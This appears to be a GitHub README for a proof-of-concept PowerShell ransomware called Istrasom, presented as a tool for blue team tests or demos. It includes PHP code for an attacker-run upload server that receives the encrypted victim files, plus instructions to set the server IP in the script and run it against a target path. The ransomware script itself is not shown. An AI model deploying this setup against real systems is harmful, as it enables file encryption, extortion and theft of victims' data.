# Istrasom
# POC_Ransomware_powershell
Maybe a POC of a ransomware with powershell to perform some blue team test or demo

You need a web server with an upload file php (used in the function upload). You can used my own upload php file. (I used the variable "filename" in my powershell script to upload encrypted files, so it can be easier for you to use the same name and same code :

Use a linux with apache server :
Place in your /var/www/html a folder named "uplaods" and a php file with the following code :

```
<?PHP
  if(!empty($_FILES['filename']))
  {
    $path = "uploads/";
    $path = $path . basename( $_FILES['filename']['name']);

    if(move_uploaded_file($_FILES['filename']['tmp_name'], $path)) {
    	 echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
      " has been uploaded";
    } 
    else{
    	echo "There was an error uploading the file, please try again!";
    }
  }
?>
```

Put in the script your server IP and the name of your uploading file
Just execute the powershell script with the command :

./Istransom.ps1 pathtoransom

